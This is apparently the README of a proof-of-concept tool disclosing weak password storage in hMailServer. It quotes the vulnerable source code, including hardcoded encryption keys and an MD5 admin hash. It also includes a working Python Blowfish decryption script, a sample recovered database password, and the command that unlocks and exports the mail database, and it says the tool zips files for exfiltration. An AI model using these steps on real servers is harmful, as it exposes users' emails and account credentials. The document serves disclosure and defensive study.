# hMailEnum
### CVE's pending

## **Proof Of Concept**

This C# code was written to demonstrate how the vulnerabilities found in the hMailServer versions 5.6.8 and 5.6.9beta software regarding it password storage can be exploited. 
It will attempt to enumerate from the registry where the important files are stored, and if not found will default to some hardcoded paths. 

The files of interest are,

`hMailServer.ini`
> contains some settings, a poorly obfuscated password to the admin console, and a poorly obfuscated password to the database.

`hMailServer.sdf`
> The database file to be decrypted with the password from `hMailServer.ini`

`hMailAdmin.exe.config`
> Some configuration regarding additional servers your admin console will connect to, most notably poorly obfuscated passwords.

which will be copied to the working directory.

The tool will then iterate through these files and run the appropriate decryption function using the hardcoded keys in the source code. 

Then it will decrypt the database, use the [ErikEJ](https://github.com/ErikEJ)/[SqlCeToolbox](https://github.com/ErikEJ/SqlCeToolbox) tool to decrypt and convert it to a more readable .SQLite database.

Then it will zip up the files, both the decrypted ones and the originals for further inspection, to make exfiltration easier. 

--- 
## **Compilation**

To compile as one standalone binary, the recommended command is as follows.
```sh
dotnet publish -c Release -r <ARCHITECTURE> --self-contained true /p:PublishSingleFile=true /p:PublishTrimmed=true hMailEnum.csproj
```

with possible Architecture values being 

'win-arm64'
'win-amd64'

---

## **Disclaimer**

1. I do **NOT** know C#. I had never touched it before this project. SO much of this is vibes spaghetti, as I was very much in 'Rapid Prototyping' mode.
2. This was largely developed on an ARM64 mac and thus tested on an ARM64 Windows 11 virtual machine. 
3. This was tested ONLY on the default install using the internal database. This doesn't adequately address more custom installations. However, the storage of passwords for a custom installation will largely be the same- This tool won't handle the exfiltration of an external custom database. 
   
As such i do **NOT** make any guarantees about the functionality of this tool. "It Works On My Machine." <3
   
---

## **Summary of Issues**

### Initial AdministratorPassword obfuscated with insecure hash

The program defaults to md5 hashing for the `AdministratorPassword` in under `[Security]` `hMailServer.INI` at setup.
```pascal
function GetHashedPassword(Param: String) : String;
begin
  Result := GetMD5OfString(g_szAdminPassword);
end;
```
> line 239 of `hmailserver/installation/hMailServerInnoExtension.iss`

This is passed to the code in our test install to `DBSetupQuick.exe` as we are not specifying a DB
```pascal
	  // Add the password as well, so that the administrator doesn't have to type it in again
      //  if he have just entered it. If this is an upgrade, he'll have to enter it again though.
      if (Length(g_szAdminPassword) > 0) then
         szParameters := szParameters + ' password:' + g_szAdminPassword;
		 
      if ((GetCurrentDatabaseType() <> '') or g_bUseInternal) then
      begin
         if (Exec(ExpandConstant('{app}\Bin\DBSetupQuick.exe'), szParameters, '', SW_SHOWNORMAL, ewWaitUntilTerminated, ResultCode) = False) then
            MsgBox(SysErrorMessage(ResultCode), mbError, MB_OK);
      end
      else
      begin
         if (Exec(ExpandConstant('{app}\Bin\DBSetup.exe'), szParameters, '', SW_SHOWNORMAL, ewWaitUntilTerminated, ResultCode) = False) then
            MsgBox(SysErrorMessage(ResultCode), mbError, MB_OK);

      end;
```
> line 646 of `hmailserver/installation/hMailServerInnoExtension.iss`

and is then written to the ini file 
```pascal
Filename: "{app}\Bin\hMailServer.INI"; Section: "Security"; Key: "AdministratorPassword"; String: "{code:GetHashedPassword}"; Flags: createkeyifdoesntexist; Components: server;
```
> line 126 of `hmailserver/installation/Shared.iss`

Additional updates to this password will be more secure by way of stronger hashing. 
```cpp
   IniFileSettings::SetAdministratorPassword(const String &sNewPassword)
   //---------------------------------------------------------------------------()
   // DESCRIPTION:
   // Updates the main hMailServer administration password found in hMailServer.ini
   //---------------------------------------------------------------------------()
   {
      administrator_password_ = HM::Crypt::Instance()->EnCrypt(sNewPassword, HM::Crypt::ETSHA256);

      WriteIniSetting_("Security", "AdministratorPassword", administrator_password_);
   }
```
> line 356 `hmailserver/source/Server/Common/Application/IniFileSettings.cpp`

but the *initial* time the password is set will still be an insecure hash.

### Blowfish implementation uses Hardcoded Password

Hardcoded password is set
``` cs
#define NOT_SECRET_KYE "THIS_KEY_IS_NOT_SECRET"
```
> line 20 `hmailserver/source/Server/Common/Util/BlowFish.cpp`

and used 
```cs
   BlowFishEncryptor::BlowFishEncryptor ()
   {
 	   PArray = new DWORD [18] ;
 	   SBoxes = new DWORD [4][256] ;

      String sKey = NOT_SECRET_KYE;
      int iKeyLen = sKey.GetLength();
      BYTE *buf = new BYTE[iKeyLen + 1];
      memset(buf, 0, iKeyLen + 1);
      strncpy_s((char*) buf, iKeyLen+1, Unicode::ToANSI(sKey), iKeyLen);
      
      Initialize(buf, iKeyLen );
     
      delete [] buf;
   }
```
> line 29 `hmailserver/source/Server/Common/Util/BlowFish.cpp`

This is then used to encrypt the database `Password` under `[Database]` in `hMailServer.INI`.

When the `hmailserver/installation/hMailServerInnoExtension.iss` runs `DBSetupQuick.exe` and calls the `CreateInternalDatabase()` function.

```cpp
      private static void InitializeInternalDatabase()
      {
          try
          {
              hMailServer.Database database = _application.Database;

              database.CreateInternalDatabase();

              // Database has been upgraded. Reinitialize the connections.
              _application.Reinitialize();

              // Re-initialize to connect to the newly created database.
              _application.Reinitialize();
          }
          catch (Exception ex)
          {
              MessageBox.Show(ex.Message, "hMailServer", MessageBoxButtons.OK, MessageBoxIcon.Error);
          }
      }

   }
}
```
> line 74 of `hmailserver/source/Tools/DBSetupQuick/Program.cs`

which calls `CreateInternalDatabase()`

```cpp
STDMETHODIMP InterfaceDatabase::CreateInternalDatabase()
{
   try
   {
      if (!config_)
         return GetAccessDenied();

   	if (!GetIsServerAdmin())
         return GetAccessDenied();
   
      // Make sure we have the latest settings.
      ini_file_settings_->LoadSettings();
   
      HM::String sDirectory = ini_file_settings_->GetDatabaseDirectory();
      HM::String sDatabaseName = "hMailServer";
      HM::String sPassword = HM::PasswordGenerator::Generate();
   
      HM::String sErrorMessage;
      if (!HM::SQLCEConnection::CreateDatabase(sDirectory, sDatabaseName, sPassword, sErrorMessage))
         return COMError::GenerateError(sErrorMessage);
   
      HM::String sEmpty;
   
```
> line 475 of `hmailserver/source/Server/COM/InterfaceDatabase.cpp`

which calls the function `PasswordGenerator::Generate()` 

```cpp
  PasswordGenerator::Generate()
   {
      String sGUID = GUIDCreator::GetGUID();

      String sOutString;

      for (int i = 0; i < sGUID.GetLength(); i++)
      {
         wchar_t c = sGUID[i];

         switch (c)
         {
         case '{':
         case '}':
         case '-':
            break;
         default:
            sOutString += c;
         }

      }

      String sRetVal = sOutString.Mid(0,12);
      return sRetVal;
   }
```
> line 28 `hmailserver/source/Server/Common/Util/PasswordGenerator.cpp`

to generate a 12 char string.

`InterfaceDatabase.cpp` then calls  `ini_file_settings_->SetPassword(sPassword);`

and then that call encrypts that password when it writes it. 
```cpp
{
password_ = sNewVal;

WriteIniSetting_("Database", "Password", Crypt::Instance()->EnCrypt(password_, Crypt::ETBlowFish));
WriteIniSetting_("Database", "PasswordEncryption", Crypt::ETBlowFish);
}
```
> line 475 file `hmailserver/source/Server/Common/Application/IniFileSettings.cpp`

So the value looks like this. `Password=fb8f1b06f59cf34cf99164835d6ae736`

when fed to this script 
```python
from Crypto.Cipher import Blowfish

def blowfish_decrypt_le(cipher_hex: str, key: bytes = b"THIS_KEY_IS_NOT_SECRET") -> str:
    # Convert hex to bytes
    ct = bytes.fromhex(cipher_hex)
    bs = Blowfish.block_size  # 8 bytes per block
    
    # Initialize ECB cipher
    cipher = Blowfish.new(key, Blowfish.MODE_ECB)
    plaintext_bytes = b''

    # Process each 8-byte block
    for i in range(0, len(ct), bs):
        block = ct[i:i+bs]
        # Reverse each 4-byte word to match encryption pre-transform
        le_block = block[:4][::-1] + block[4:][::-1]
        # Decrypt
        dec_le = cipher.decrypt(le_block)
        # Reverse words back to big-endian
        dec_be = dec_le[:4][::-1] + dec_le[4:][::-1]
        plaintext_bytes += dec_be

    # Strip trailing zero-byte padding
    plaintext_bytes = plaintext_bytes.rstrip(b'\x00')
    # Decode to UTF-8
    return plaintext_bytes.decode('utf-8', errors='ignore')


# Example self-test
if __name__ == "__main__":
    test_ct = "fb8f1b06f59cf34cf99164835d6ae736"
    recovered = blowfish_decrypt_le(test_ct)
    print("Recovered plaintext:", recovered)
```

I retrieve the value `Recovered plaintext: 5C7662397665`

This then unlocks the database and allows me to export it as a more readable .sql script that will generate a sqlite db using this tool https://github.com/ErikEJ/SqlCeToolbox

```cmd
> .\ExportSqlCe.exe "Data Source=hMailServer.sdf;Password=5C7662397665;" hMailServer.sql sqlite
Initializing....
Generating the tables....
Generating the data....
Generating the indexes....
Sent script to output file(s) : hMailServer.sql in 633 ms
```

With this you now have access to emails and account information.

passwords for users ARE obfuscated using salted SHA256 

```cpp
pAccount->SetPassword(Crypt::Instance()->EnCrypt(pAccount->GetPassword(), (HM::Crypt::EncryptionType) preferredHashAlgorithm)); 
```
> line 187 `hmailserver/source/Server/Common/Persistence/PersistentAccount.cpp`

says to use the preferred algorithm

```cpp
      preferred_hash_algorithm_(3),
```
> line 29 `hmailserver/source/Server/Common/Application/IniFileSettings.cpp`

indicates that the algorithm is preset to 3 

```cpp
      enum EncryptionType
      {
         ETNone = 0,
         ETBlowFish = 1,
         ETMD5 = 2,
         ETSHA256 = 3
      };
```
> line 16 in `hmailserver/source/Server/Common/Util/Crypt.h`

shows 3 corresponding to etsha256.

```cpp
      case ETSHA256:
         {
            HashCreator encrypter(HashCreator::SHA256);
            AnsiString result = encrypter.GenerateHash(sInput, "");
            return result;
         }
```
> line 46 of `hmailserver/source/Server/Common/Util/Crypt.cpp`

shows that in this context it generates a hash, and does not specify no salt in the function name like line 43 does `String sResult = crypter.GenerateHashNoSalt(sInput, HashCreator::hex);`
### Ivan Medvedev

Here we see the password taken in when creating a new server connection in the Admin GUI
```cpp
      private void btnSave_Click(object sender, EventArgs e)
      {
         server.hostName = textHostname.Text;
         server.userName = textUsername.Text;
         server.savePassword = radioSavePassword.Checked;

         if (textPassword.Dirty)
            server.encryptedPassword = Encryption.Encrypt(textPassword.Password);

         this.DialogResult = DialogResult.OK;
      }
```
> line 44 in `hmailserver/source/Tools/Administrator/Dialogs/formServerInformation.cs`

using this function, it's encrypted.

```cs
        private static string NOT_SECRET_KEY = "THIS_KEY_IS_NOT_SECRET";

        public static string Encrypt(string plainText)
        {
            // Encryption operates on byte arrays, not on strings.
            byte[] plainTextBytes =
              System.Text.Encoding.Unicode.GetBytes(plainText);

            // Derive a key from the password.
            PasswordDeriveBytes passwordDerivedBytes = new PasswordDeriveBytes(NOT_SECRET_KEY,
                new byte[] {0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76});

            // Use Rijndael symmetric algorithm to do the encryption.
            Rijndael rijndaelAlgorithm = Rijndael.Create();
            rijndaelAlgorithm.Key = passwordDerivedBytes.GetBytes(32);
            rijndaelAlgorithm.IV = passwordDerivedBytes.GetBytes(16);

            MemoryStream memoryStream = new MemoryStream();

            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelAlgorithm.CreateEncryptor(), CryptoStreamMode.Write);
            cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
            cryptoStream.Close();

            byte[] encryptedBytes = memoryStream.ToArray();

            return Convert.ToBase64String(encryptedBytes);

        }
```
> line 12 in `hmailserver/source/Tools/Administrator/Utilities/Encryption.cs`

when you save it runs a function to write to a file called `hMailAdmin.exe.config`
```cpp
        public static void Save(UserSettings settings)
        {
            string settingsFile = Path.Combine(CreateSettingsFolder(), "hMailAdmin.exe.config");

            XmlTextWriter writer = new XmlTextWriter(settingsFile, Encoding.UTF8);
            
            try
            {
                writer.Formatting = Formatting.Indented;

                XmlSerializer xmlSerializer = new XmlSerializer(typeof(UserSettings));
                xmlSerializer.Serialize(writer, settings);
            }
```
> line 65 `hmailserver/source/Tools/Administrator/Utilities/Settings/UserSettings.cs`

which creates a file at `%APPDATA%\hMailServer\Administrator\hMailAdmin.exe.config`

```xml
      <Server>
        <hostName>localhost</hostName>
        <userName>Administrator</userName>
        <encryptedPassword>1WWKZ+ZOBmor+9SYwo/fwg==</encryptedPassword>
        <savePassword>true</savePassword>
      </Server>
```

With entries like the following.

The Value is base64 encoded same as the function. 

The hardcoded decryption function will decrypt that string in the `<encryptedPassword>` tag to test1.

---

## **Links of Import**

- https://www.hmailserver.com/
- https://github.com/hmailserver/hmailserver
-  [ErikEJ](https://github.com/ErikEJ)/[SqlCeToolbox](https://github.com/ErikEJ/SqlCeToolbox)
- [Blog Post](https://littlemaninmyhead.wordpress.com/2021/09/15/if-you-copied-any-of-these-popular-stackoverflow-encryption-code-snippets-then-you-did-it-wrong/)

---

## **Special Thanks !!**

Thank you [Adele Miller](https://www.linkedin.com/in/aamiller/) for pointing me to the blog post for the initial discovery of the vulnerability with the hardcoded salt and showing me how to look for it in new places! 

Thank You Scott Contini for your blog post which further clarified the Ivan Medvedev problem.

Thank you Erik Ejlskov Jensen for your SQL tool! Good god did that make my life easier. 
